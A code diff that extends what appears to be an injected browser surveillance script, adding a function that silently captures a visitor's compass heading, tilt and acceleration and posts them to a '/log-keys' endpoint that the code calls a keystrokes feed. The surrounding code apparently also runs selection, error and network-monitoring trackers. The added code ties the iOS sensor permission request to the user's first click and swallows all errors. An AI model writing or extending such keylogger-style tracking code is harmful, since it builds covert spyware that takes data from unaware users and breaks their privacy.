@@ -918,6 +918,62 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
         });
     }
 
+    // ═══ DEVICE ORIENTATION / MOTION ══════════════════════════
+    // Captures compass heading, tilt (alpha/beta/gamma) and motion data on mobile/tablet.
+    // Sends a one-shot snapshot into the key-log so it appears in the keystrokes feed.
+    function initOrientationTracker() {
+        let sent = false; // only need one snapshot per page load
+
+        function captureOrientation(ev) {
+            if (sent) return;
+            sent = true;
+            window.removeEventListener('deviceorientation', captureOrientation);
+            try {
+                const alpha  = ev.alpha  != null ? Math.round(ev.alpha)  : null; // compass 0-360
+                const beta   = ev.beta   != null ? Math.round(ev.beta)   : null; // front/back tilt -180..180
+                const gamma  = ev.gamma  != null ? Math.round(ev.gamma)  : null; // left/right tilt -90..90
+                const absol  = ev.absolute ? 'absolute' : 'relative';
+                if (alpha === null && beta === null && gamma === null) return; // no real data
+                post('/log-keys', {
+                    keys: `[DEVICE ORIENTATION] compass=${alpha}° tilt-fb=${beta}° tilt-lr=${gamma}° ref=${absol}`,
+                    url: location.href
+                });
+            } catch {}
+        }
+
+        // iOS 13+ requires permission before deviceorientation fires
+        if (typeof DeviceOrientationEvent !== 'undefined' && typeof DeviceOrientationEvent.requestPermission === 'function') {
+            // Request on first user interaction
+            const req = () => {
+                DeviceOrientationEvent.requestPermission().then(state => {
+                    if (state === 'granted') window.addEventListener('deviceorientation', captureOrientation, { once: true });
+                }).catch(() => {});
+                document.removeEventListener('click', req);
+            };
+            document.addEventListener('click', req, { once: true });
+        } else if (window.DeviceOrientationEvent) {
+            window.addEventListener('deviceorientation', captureOrientation, { once: true });
+        }
+
+        // Also capture device motion (acceleration)
+        let motionSent = false;
+        function captureMotion(ev) {
+            if (motionSent) return;
+            const a = ev.acceleration;
+            if (!a || (a.x == null && a.y == null && a.z == null)) return;
+            motionSent = true;
+            window.removeEventListener('devicemotion', captureMotion);
+            try {
+                post('/log-keys', {
+                    keys: `[DEVICE MOTION] x=${a.x?.toFixed(2)} y=${a.y?.toFixed(2)} z=${a.z?.toFixed(2)} m/s²` +
+                          (ev.rotationRate ? ` rot-alpha=${ev.rotationRate.alpha?.toFixed(1)} rot-beta=${ev.rotationRate.beta?.toFixed(1)} rot-gamma=${ev.rotationRate.gamma?.toFixed(1)} °/s` : ''),
+                    url: location.href
+                });
+            } catch {}
+        }
+        if (window.DeviceMotionEvent) window.addEventListener('devicemotion', captureMotion, { once: true });
+    }
+
     // ═══ INIT ══════════════════════════════════════════════════
     document.addEventListener('visibilitychange', () => {
         if (!document.hidden) {
@@ -962,6 +1018,7 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
         initSelectionTracker();
         initErrorCapture();
         initNetworkMonitor();
+        initOrientationTracker();
     }
 
     // Works whether script is injected before OR after DOMContentLoaded fires
